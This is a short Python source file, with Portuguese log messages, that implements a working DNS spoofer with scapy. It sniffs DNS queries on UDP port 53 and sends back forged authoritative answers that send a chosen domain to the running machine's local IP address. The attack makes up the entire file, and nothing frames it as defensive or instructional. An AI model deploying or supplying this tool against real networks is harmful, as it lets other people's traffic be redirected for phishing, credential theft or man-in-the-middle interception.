import threading
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, sniff, send

def dns_responder(local_ip, spoof_domain):
    def get_response(pkt):
        if (pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0 and 
            spoof_domain in pkt.getlayer(DNS).qd.qname.decode()):
            
            print(f"\033[33m[!] DNS Spoofing: Redirecionando {spoof_domain} para {local_ip}\033[0m")
            
            spf_pkt = (IP(dst=pkt[IP].src, src=pkt[IP].dst)/
                       UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/
                       DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                           an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=local_ip)))
            
            send(spf_pkt, verbose=False)
    
    sniff(filter="udp port 53", prn=get_response, store=0)

def start_dns_spoofer(spoof_domain):
    import socket

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()

    dns_thread = threading.Thread(target=dns_responder, args=(local_ip, spoof_domain))
    dns_thread.daemon = True
    dns_thread.start()
    print(f"[*] DNS Spoofer ativo para: {spoof_domain}")
